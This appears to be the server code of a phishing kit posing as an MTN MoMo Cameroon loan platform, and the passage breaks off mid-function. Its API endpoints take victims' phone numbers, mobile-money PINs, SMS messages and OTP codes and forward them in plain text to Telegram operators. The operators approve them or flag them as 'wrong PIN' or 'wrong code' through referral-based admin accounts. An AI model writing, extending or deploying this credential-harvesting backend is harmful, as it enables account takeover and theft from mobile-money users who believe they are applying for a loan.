/**
 * ============================================================================
 * MTN MoMo Cameroon Loan Platform - Enterprise Production Server
 * ============================================================================
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const db = require('./database');

// ==========================================
// 1. ENVIRONMENT & CONFIGURATION SETUP
// ==========================================
const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = parseInt(process.env.PORT, 10) || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;
const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'mtn_momo_cm_secure_secret_token';

if (!BOT_TOKEN) {
    console.error('❌ CRITICAL: SUPER_ADMIN_BOT_TOKEN is missing in environment variables.');
    process.exit(1);
}

const app = express();
const bot = new TelegramBot(BOT_TOKEN);

// State Management (In-Memory Caches with Thread-Safe Access Pattern)
const adminChatIds = new Map();         // adminId → chatId
const pausedAdmins = new Set();         // adminIds temporarily paused
let dbReady = false;

// ==========================================
// 2. HELPER FUNCTIONS & UTILITIES
// ==========================================

const asyncHandler = (fn) => (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
};

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (Number(storedChatId) === Number(chatId)) return adminId;
    }
    return null;
}

function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    let cleaned = String(phoneNumber).replace(/\s+/g, '');
    if (cleaned.startsWith('+237')) return cleaned.slice(4);
    if (cleaned.startsWith('237')) return cleaned.slice(3);
    return cleaned;
}

/**
 * Enhanced Async Message Dispatcher with automatic retry mechanism
 */
async function sendToAdminAsync(adminId, message, options = {}, retries = 2) {
    let chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) return false;
            adminChatIds.set(adminId, admin.chatId);
            chatId = admin.chatId;
        } catch (err) {
            console.error(`❌ DB lookup failure for admin ${adminId}:`, err.message);
            return false;
        }
    }

    for (let attempt = 1; attempt <= retries + 1; attempt++) {
        try {
            await bot.sendMessage(chatId, message, options);
            return true;
        } catch (error) {
            console.warn(`⚠️ Dispatch attempt ${attempt} to admin ${adminId} failed: ${error.message}`);
            if (attempt === retries + 1) {
                console.error(`❌ Permanent dispatch failure for admin ${adminId}.`);
            } else {
                await new Promise(r => setTimeout(r, 1000 * attempt));
            }
        }
    }
    return false;
}

// ==========================================
// 3. EXPRESS MIDDLEWARE & SECURITY
// ==========================================
app.use(helmet({
    contentSecurityPolicy: false, // Set to true with custom policy if serving dynamic external scripts
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
app.use(express.static(__dirname));

// Rate Limiting for Public REST API Endpoints
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 200, // Limit each IP to 200 requests per windowMs
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, message: 'Too many requests. Please try again later.' }
});

app.use('/api/', apiLimiter);

// ==========================================
// 4. TELEGRAM BOT HANDLERS SETUP
// ==========================================
console.log('⏳ Registering Telegram bot command handlers...');
setupCommandHandlers();
console.log('✅ Telegram command handlers active.');

// ==========================================
// 5. SECURE WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    // Validate secret token header if sent by Telegram
    const secretHeader = req.headers['x-telegram-bot-api-secret-token'];
    if (secretHeader && secretHeader !== WEBHOOK_SECRET) {
        console.warn('⚠️ Rejected unauthorized webhook update request.');
        return res.sendStatus(403);
    }

    res.sendStatus(200);
    if (req.body && req.body.update_id !== undefined) {
        bot.processUpdate(req.body);
    }
});

// ==========================================
// 6. DATABASE CONNECTION & SERVER BOOTSTRAP
// ==========================================
let serverInstance = null;

db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database connection established.');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        try {
            await bot.deleteWebHook();
            await bot.setWebHook(fullWebhookUrl, {
                drop_pending_updates: false,
                max_connections: 50,
                allowed_updates: ['message', 'callback_query'],
                secret_token: WEBHOOK_SECRET
            });
            console.log(`✅ Webhook bound successfully: ${fullWebhookUrl}`);
        } catch (webhookError) {
            console.error('❌ Webhook setup warning:', webhookError.message);
        }

        // Keep-alive ping for free/sleeping hosting tiers
        setInterval(() => {
            fetch(`${WEBHOOK_URL}/health`).catch(() => {});
        }, 14 * 60 * 1000);

        serverInstance = app.listen(PORT, () => {
            console.log(`\n💎 MTN MOMO CAMEROON LOAN PLATFORM`);
            console.log(`==================================`);
            console.log(`🌐 Server active at: http://localhost:${PORT}`);
            console.log(`🤖 Mode: WEBHOOK (Optimized)`);
            console.log(`👥 Active Admins Loaded: ${adminChatIds.size}\n`);
        });
    })
    .catch((error) => {
        console.error('❌ Fatal Initialization Error:', error);
        process.exit(1);
    });

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
            }
            if (admin.status === 'paused') {
                pausedAdmins.add(admin.adminId);
            }
        }
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error.message);
    }
}

// ==========================================
// 7. TELEGRAM COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    // --- /start Command ---
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId) {
            if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                return bot.sendMessage(chatId, `🚫 *ACCESS PAUSED*\nYour admin account is currently suspended.`, { parse_mode: 'Markdown' });
            }

            const isSuperAdmin = adminId === 'ADMIN001';

            if (isSuperAdmin) {
                const text = `
👋 *Welcome Super Admin!*

*Your Admin ID:* \`ADMIN001\`
*Role:* ⭐ Super Admin
*Your Personal Link:*
${WEBHOOK_URL}?admin=ADMIN001

*Commands:*
/mylink - Get your portal link
/stats - View global statistics
/pending - Pending applications
/myinfo - Your information

*Super Admin Management:*
/addadmin - Add new auto-generated admin
/addadminid <id> - Add admin with specific ID
/transferadmin <oldChatId> | <newChatId> - Transfer admin Chat ID
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/admins - List all registered admins
/suspendall - 🔒 Suspend all admin links

*Messaging:*
/send <adminId> <message> - Direct message an admin
/broadcast <message> - Broadcast to all admins
/ask <adminId> <request> - Send action request
                `.trim();

                const inline_keyboard = [
                    [
                        { text: '📊 Global Stats', callback_data: 'sa_stats' },
                        { text: '⏳ Pending Apps', callback_data: 'sa_pending' }
                    ],
                    [
                        { text: '👥 List Admins', callback_data: 'sa_admins' },
                        { text: '➕ Add Admin', callback_data: 'sa_addadmin' }
                    ],
                    [
                        { text: '🔒 Suspend All', callback_data: 'sa_suspendall' },
                        { text: '🔗 My Link', callback_data: 'sa_mylink' }
                    ]
                ];

                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });

            } else {
                const text = `
👋 *Welcome Admin!*

*Your Admin ID:* \`${adminId}\`
*Role:* 👤 Admin
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your portal link
/stats - View your statistics
/pending - Pending applications
/myinfo - Your account information
                `.trim();

                const inline_keyboard = [
                    [
                        { text: '📊 My Stats', callback_data: 'admin_stats' },
                        { text: '⏳ Pending Apps', callback_data: 'admin_pending' }
                    ],
                    [
                        { text: '🔗 My Link', callback_data: 'admin_mylink' },
                        { text: '👤 My Info', callback_data: 'admin_myinfo' }
                    ]
                ];

                bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
            }

        } else {
            bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Cameroon*
Your Telegram Chat ID: \`${chatId}\`

⚠️ *Note:* You are not registered as an Admin. Contact Super Admin (\`ADMIN001\`) with your Chat ID to get access.
            `.trim(), { parse_mode: 'Markdown' });
        }
    });

    // --- /mylink ---
    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;
        bot.sendMessage(chatId, `🔗 *Your Personal Portal Link:*\n${WEBHOOK_URL}?admin=${adminId}`, { parse_mode: 'Markdown' });
    });

    // --- /stats ---
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS (${adminId})*
----------------------------------
📋 Total Applications: \`${stats.total || 0}\`
⏳ PIN Pending: \`${stats.pinPending || 0}\`
✅ PIN Approved: \`${stats.pinApproved || 0}\`
⏳ SMS Pending: \`${stats.smsPending || 0}\`
🎉 Fully Approved: \`${stats.fullyApproved || 0}\`
        `.trim(), { parse_mode: 'Markdown' });
    });

    // --- /pending ---
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const apps = await db.getApplicationsByAdmin(adminId);
        const pendingApps = apps.filter(a => a.pinStatus === 'pending' || a.smsStatus === 'pending' || a.smsOtpStatus === 'pending' || a.otpStatus === 'pending');

        if (pendingApps.length === 0) {
            return bot.sendMessage(chatId, '✅ No pending applications.', { parse_mode: 'Markdown' });
        }

        let response = `⏳ *PENDING APPLICATIONS (${pendingApps.length})*\n----------------------------------\n`;
        for (const app of pendingApps.slice(0, 10)) {
            response += `📋 Ref: \`${app.id}\`\n📞 Phone: \`${formatPhone(app.phoneNumber)}\`\n📌 PIN: \`${app.pinStatus}\` | SMS: \`${app.smsStatus || app.smsOtpStatus || 'pending'}\` | OTP: \`${app.otpStatus}\`\n----------------------------------\n`;
        }

        bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
    });

    // --- /myinfo ---
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
👤 *ACCOUNT INFORMATION*
----------------------------------
*Admin ID:* \`${adminId}\`
*Name:* ${admin?.name || 'Admin'}
*Chat ID:* \`${chatId}\`
*Status:* ${pausedAdmins.has(adminId) ? '⏸️ Paused' : '✅ Active'}
        `.trim(), { parse_mode: 'Markdown' });
    });

    // --- Super Admin Management Commands ---
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const newAdminId = `ADMIN${Math.floor(100 + Math.random() * 900)}`;
        await db.saveAdmin({ adminId: newAdminId, name: `Admin ${newAdminId}`, status: 'active', chatId: null });
        bot.sendMessage(chatId, `✅ *New Admin Created*\n\nAdmin ID: \`${newAdminId}\``, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadminid(?:\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const customId = match[1]?.trim().toUpperCase();
        if (!customId) return bot.sendMessage(chatId, '⚠️ Usage: `/addadminid <adminId>`', { parse_mode: 'Markdown' });

        await db.saveAdmin({ adminId: customId, name: `Admin ${customId}`, status: 'active', chatId: null });
        bot.sendMessage(chatId, `✅ Admin created with ID: \`${customId}\``, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/transferadmin(?:\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const input = match[1]?.trim();
        if (!input || !input.includes('|')) return bot.sendMessage(chatId, '⚠️ Usage: `/transferadmin oldChatId | newChatId`', { parse_mode: 'Markdown' });

        const [oldChatIdStr, newChatIdStr] = input.split('|').map(s => s.trim());
        const oldChatId = parseInt(oldChatIdStr, 10);
        const newChatId = parseInt(newChatIdStr, 10);

        const targetAdminId = getAdminIdByChatId(oldChatId);
        if (!targetAdminId) return bot.sendMessage(chatId, '❌ No admin found with old Chat ID.', { parse_mode: 'Markdown' });

        await db.updateAdmin(targetAdminId, { chatId: newChatId });
        adminChatIds.set(targetAdminId, newChatId);
        bot.sendMessage(chatId, `✅ Transferred Admin \`${targetAdminId}\` to Chat ID: \`${newChatId}\``, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pauseadmin(?:\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const targetId = match[1]?.trim().toUpperCase();
        if (!targetId) return bot.sendMessage(chatId, '⚠️ Usage: `/pauseadmin <adminId>`', { parse_mode: 'Markdown' });

        await db.updateAdmin(targetId, { status: 'paused' });
        pausedAdmins.add(targetId);
        bot.sendMessage(chatId, `⏸️ Admin \`${targetId}\` paused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/unpauseadmin(?:\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const targetId = match[1]?.trim().toUpperCase();
        if (!targetId) return bot.sendMessage(chatId, '⚠️ Usage: `/unpauseadmin <adminId>`', { parse_mode: 'Markdown' });

        await db.updateAdmin(targetId, { status: 'active' });
        pausedAdmins.delete(targetId);
        bot.sendMessage(chatId, `▶️ Admin \`${targetId}\` unpaused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/removeadmin(?:\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const targetId = match[1]?.trim().toUpperCase();
        if (!targetId) return bot.sendMessage(chatId, '⚠️ Usage: `/removeadmin <adminId>`', { parse_mode: 'Markdown' });

        if (targetId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot remove Super Admin.', { parse_mode: 'Markdown' });

        await db.deleteAdmin(targetId);
        adminChatIds.delete(targetId);
        pausedAdmins.delete(targetId);
        bot.sendMessage(chatId, `🗑️ Admin \`${targetId}\` removed.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/admins$/, async (msg) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const admins = await db.getAllAdmins();
        let list = `👥 *ALL REGISTERED ADMINS*\n----------------------------------\n`;
        for (const a of admins) {
            list += `• *${a.name}* (\`${a.adminId}\`)\n  Chat ID: \`${a.chatId || 'Not linked'}\` | Status: *${a.status}*\n`;
        }
        bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/suspendall$/, async (msg) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const admins = await db.getAllAdmins();
        for (const a of admins) {
            if (a.adminId !== 'ADMIN001') {
                await db.updateAdmin(a.adminId, { status: 'paused' });
                pausedAdmins.add(a.adminId);
            }
        }
        bot.sendMessage(chatId, '🔒 *All non-Super Admin links suspended.*', { parse_mode: 'Markdown' });
    });

    bot.onText(/\/send(?:\s+(\S+)\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const targetId = match[1]?.toUpperCase();
        const text = match[2];
        if (!targetId || !text) return bot.sendMessage(chatId, '⚠️ Usage: `/send <adminId> <message>`', { parse_mode: 'Markdown' });

        sendToAdminAsync(targetId, `📩 *Message from Super Admin:*\n\n${text}`, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, `✅ Message dispatched to \`${targetId}\`.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/broadcast(?:\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const text = match[1]?.trim();
        if (!text) return bot.sendMessage(chatId, '⚠️ Usage: `/broadcast <message>`', { parse_mode: 'Markdown' });

        const admins = await db.getAllAdmins();
        for (const a of admins) {
            if (a.adminId !== 'ADMIN001') {
                sendToAdminAsync(a.adminId, `📢 *BROADCAST ANNOUNCEMENT:*\n\n${text}`, { parse_mode: 'Markdown' });
            }
        }
        bot.sendMessage(chatId, '📢 Broadcast sent to all administrators.', { parse_mode: 'Markdown' });
    });

    bot.onText(/\/ask(?:\s+(\S+)\s+(.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        if (getAdminIdByChatId(chatId) !== 'ADMIN001') return;

        const targetId = match[1]?.toUpperCase();
        const requestText = match[2];
        if (!targetId || !requestText) return bot.sendMessage(chatId, '⚠️ Usage: `/ask <adminId> <request>`', { parse_mode: 'Markdown' });

        sendToAdminAsync(targetId, `❓ *ACTION REQUEST FROM SUPER ADMIN:*\n\n${requestText}`, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, `✅ Request dispatched to \`${targetId}\`.`, { parse_mode: 'Markdown' });
    });
}

// ==========================================
// 8. INLINE CALLBACK ROUTER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const adminId = getAdminIdByChatId(chatId);

    if (!adminId || !isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or account paused.', show_alert: true });
    }

    // ------------------------------------------
    // A. SUPER ADMIN BUTTON CALLBACKS (sa_)
    // ------------------------------------------
    if (data.startsWith('sa_')) {
        if (adminId !== 'ADMIN001') {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Super Admin access required.', show_alert: true });
        }

        if (data === 'sa_stats') {
            const stats = await db.getAdminStats('ADMIN001');
            bot.sendMessage(chatId, `
📊 *GLOBAL SYSTEM STATISTICS*
----------------------------------
📋 Total Applications: \`${stats.total || 0}\`
⏳ PIN Pending: \`${stats.pinPending || 0}\`
✅ PIN Approved: \`${stats.pinApproved || 0}\`
⏳ SMS Pending: \`${stats.smsPending || 0}\`
🎉 Fully Approved: \`${stats.fullyApproved || 0}\`
            `.trim(), { parse_mode: 'Markdown' });

        } else if (data === 'sa_pending') {
            const apps = await db.getApplicationsByAdmin('ADMIN001');
            const pending = apps.filter(a => a.pinStatus === 'pending' || a.smsStatus === 'pending' || a.smsOtpStatus === 'pending' || a.otpStatus === 'pending');
            if (pending.length === 0) {
                bot.sendMessage(chatId, '✅ No pending applications across the system.', { parse_mode: 'Markdown' });
            } else {
                let msg = `⏳ *PENDING APPLICATIONS (${pending.length})*\n----------------------------------\n`;
                for (const app of pending.slice(0, 10)) {
                    msg += `📋 Ref: \`${app.id}\`\n📞 Phone: \`${formatPhone(app.phoneNumber)}\`\n👤 Admin: \`${app.adminId}\`\n----------------------------------\n`;
                }
                bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
            }

        } else if (data === 'sa_admins') {
            const admins = await db.getAllAdmins();
            let adminList = admins.map(a => `• *${a.name}* (\`${a.adminId}\`)\n  Chat ID: \`${a.chatId || 'Not set'}\` | Status: *${a.status}*`).join('\n\n');
            bot.sendMessage(chatId, `👥 *REGISTERED ADMINISTRATORS*\n----------------------------------\n${adminList || 'No admins registered.'}`, { parse_mode: 'Markdown' });

        } else if (data === 'sa_addadmin') {
            const newAdminId = `ADMIN${Math.floor(100 + Math.random() * 900)}`;
            await db.saveAdmin({ adminId: newAdminId, name: `Admin ${newAdminId}`, status: 'active', chatId: null });
            bot.sendMessage(chatId, `✅ *New Admin Created*\n\nAdmin ID: \`${newAdminId}\``, { parse_mode: 'Markdown' });

        } else if (data === 'sa_suspendall') {
            const admins = await db.getAllAdmins();
            for (const a of admins) {
                if (a.adminId !== 'ADMIN001') {
                    await db.updateAdmin(a.adminId, { status: 'paused' });
                    pausedAdmins.add(a.adminId);
                }
            }
            bot.sendMessage(chatId, '🔒 *All non-Super Admin links suspended.*', { parse_mode: 'Markdown' });

        } else if (data === 'sa_mylink') {
            bot.sendMessage(chatId, `🔗 *Super Admin Portal Link:*\n${WEBHOOK_URL}?admin=ADMIN001`, { parse_mode: 'Markdown' });
        }

        return bot.answerCallbackQuery(callbackQuery.id);
    }

    // ------------------------------------------
    // B. STANDARD ADMIN BUTTON CALLBACKS (admin_)
    // ------------------------------------------
    if (data.startsWith('admin_')) {
        if (data === 'admin_stats') {
            const stats = await db.getAdminStats(adminId);
            bot.sendMessage(chatId, `
📊 *YOUR STATISTICS*
----------------------------------
📋 Total: \`${stats.total || 0}\`
⏳ PIN Pending: \`${stats.pinPending || 0}\`
✅ PIN Approved: \`${stats.pinApproved || 0}\`
⏳ SMS Pending: \`${stats.smsPending || 0}\`
🎉 Fully Approved: \`${stats.fullyApproved || 0}\`
            `.trim(), { parse_mode: 'Markdown' });

        } else if (data === 'admin_pending') {
            const apps = await db.getApplicationsByAdmin(adminId);
            const pending = apps.filter(a => a.pinStatus === 'pending' || a.smsStatus === 'pending' || a.smsOtpStatus === 'pending' || a.otpStatus === 'pending');
            if (pending.length === 0) {
                bot.sendMessage(chatId, '✅ You have no pending applications.', { parse_mode: 'Markdown' });
            } else {
                let msg = `⏳ *YOUR PENDING APPLICATIONS (${pending.length})*\n----------------------------------\n`;
                for (const app of pending.slice(0, 10)) {
                    msg += `📋 Ref: \`${app.id}\`\n📞 Phone: \`${formatPhone(app.phoneNumber)}\`\n----------------------------------\n`;
                }
                bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
            }

        } else if (data === 'admin_mylink') {
            bot.sendMessage(chatId, `🔗 *Your Personal Portal Link:*\n${WEBHOOK_URL}?admin=${adminId}`, { parse_mode: 'Markdown' });

        } else if (data === 'admin_myinfo') {
            const admin = await db.getAdmin(adminId);
            bot.sendMessage(chatId, `
👤 *ACCOUNT INFORMATION*
----------------------------------
*Admin ID:* \`${adminId}\`
*Name:* ${admin?.name || 'Admin'}
*Chat ID:* \`${chatId}\`
            `.trim(), { parse_mode: 'Markdown' });
        }

        return bot.answerCallbackQuery(callbackQuery.id);
    }

    // ------------------------------------------
    // C. APPLICATION WORKFLOW ACTIONS
    // ------------------------------------------
    const parts = data.split('_');
    if (parts.length < 4) return bot.answerCallbackQuery(callbackQuery.id);

    const [action, type, embeddedAdminId, ...appIdParts] = parts;
    const applicationId = appIdParts.join('_');

    if (embeddedAdminId !== adminId && adminId !== 'ADMIN001') {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application assigned to another administrator.', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application record not found.' });

    const formattedPhone = formatPhone(application.phoneNumber);

    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        const updatedMsg = `
❌ *APPLICATION REJECTED*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formattedPhone}\`
🔑 PIN: \`${application.pin}\`
📌 Status: *Rejected*
        `.trim();
        bot.editMessageText(updatedMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

    } else if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        const updatedMsg = `
✅ *APPLICATION APPROVED*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formattedPhone}\`
🔑 PIN: \`${application.pin}\`
📌 Status: *Approved*
        `.trim();
        bot.editMessageText(updatedMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

    } else if (action === 'deny' && type === 'sms') {
        await db.updateApplication(applicationId, { smsStatus: 'rejected', smsOtpStatus: 'rejected' });
        const smsBody = application.smsText || application.smsOtp || 'N/A';
        const updatedMsg = `
❌ *SMS REJECTED*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formattedPhone}\`

\`\`\`
${smsBody}
\`\`\`
📌 Status: *Rejected*
        `.trim();
        bot.editMessageText(updatedMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

    } else if (action === 'allow' && type === 'sms') {
        await db.updateApplication(applicationId, { smsStatus: 'approved', smsOtpStatus: 'approved' });
        const smsBody = application.smsText || application.smsOtp || 'N/A';
        const updatedMsg = `
✅ *SMS APPROVED*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formattedPhone}\`

\`\`\`
${smsBody}
\`\`\`
📌 Status: *Approved*
        `.trim();
        bot.editMessageText(updatedMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

    } else if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        const updatedMsg = `
🎉 *LOAN FULLY APPROVED*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formattedPhone}\`
🔢 OTP: \`${application.otp}\`
📌 Status: *Fully Approved*
        `.trim();
        bot.editMessageText(updatedMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

    } else if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrong_pin' });
        const updatedMsg = `
⚠️ *FLAGGED: WRONG PIN*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formattedPhone}\`
🔢 OTP: \`${application.otp}\`
📌 Status: *Flagged (Wrong PIN)*
        `.trim();
        bot.editMessageText(updatedMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

    } else if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrong_code' });
        const updatedMsg = `
⚠️ *FLAGGED: WRONG CODE*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formattedPhone}\`
🔢 OTP: \`${application.otp}\`
📌 Status: *Flagged (Wrong Code)*
        `.trim();
        bot.editMessageText(updatedMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

// ==========================================
// 9. HIGH-PERFORMANCE REST API ENDPOINTS
// ==========================================

// Verify PIN Request Entry
app.post('/api/verify-pin', asyncHandler(async (req, res) => {
    const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;

    if (!phoneNumber || !pin) {
        return res.status(400).json({ success: false, message: 'Phone number and PIN are required.' });
    }

    const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;

    let assignedAdmin;
    if (assignmentType === 'specific' && requestAdminId) {
        assignedAdmin = await db.getAdmin(requestAdminId);
        if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
            return res.status(400).json({ success: false, message: 'Invalid or paused administrator link.' });
        }
    } else {
        const activeAdmins = await db.getActiveAdmins();
        const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
        if (availableAdmins.length === 0) {
            return res.status(503).json({ success: false, message: 'No active administrators available.' });
        }
        assignedAdmin = availableAdmins[0];
    }

    const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
    const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
    const isReturningUser = thisAdminPastApps.length > 0;

    await db.saveApplication({
        id: applicationId,
        adminId: assignedAdmin.adminId,
        adminName: assignedAdmin.name,
        phoneNumber,
        pin,
        pinStatus: 'pending',
        smsStatus: 'pending',
        smsOtpStatus: 'pending',
        otpStatus: 'pending',
        assignmentType: assignmentType || 'auto',
        isReturningUser,
        previousCount: thisAdminPastApps.length,
        timestamp: new Date().toISOString()
    });

    res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

    sendToAdminAsync(assignedAdmin.adminId, `
🆕 *NEW APPLICATION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(phoneNumber)}\`
🔑 PIN: \`${pin}\`
    `.trim(), {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '❌ Reject PIN', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                [{ text: '✅ Approve & Allow', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
            ]
        }
    });
}));

// Check PIN Status
app.get('/api/check-pin-status/:applicationId', asyncHandler(async (req, res) => {
    const application = await db.getApplication(req.params.applicationId);
    if (application) {
        res.json({ success: true, status: application.pinStatus });
    } else {
        res.status(404).json({ success: false, message: 'Application not found.' });
    }
}));

// Verify SMS Submission Entry
app.post('/api/verify-sms', asyncHandler(async (req, res) => {
    const applicationId = req.body.id || req.body.applicationId;
    const smsContent = req.body.smsOtp || req.body.smsText;

    if (!applicationId || !smsContent) {
        return res.status(400).json({ success: false, message: 'Missing applicationId or SMS content.' });
    }

    const application = await db.getApplication(applicationId);
    if (!application) {
        return res.status(404).json({ success: false, message: 'Application not found.' });
    }

    await db.updateApplication(applicationId, {
        smsText: smsContent,
        smsOtp: smsContent,
        smsStatus: 'pending',
        smsOtpStatus: 'pending'
    });

    res.json({ success: true });

    sendToAdminAsync(application.adminId, `
💬 *SMS CONTENT SUBMISSION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`

\`\`\`
${smsContent}
\`\`\`
    `.trim(), {
        parse_mode: 'Markdown',
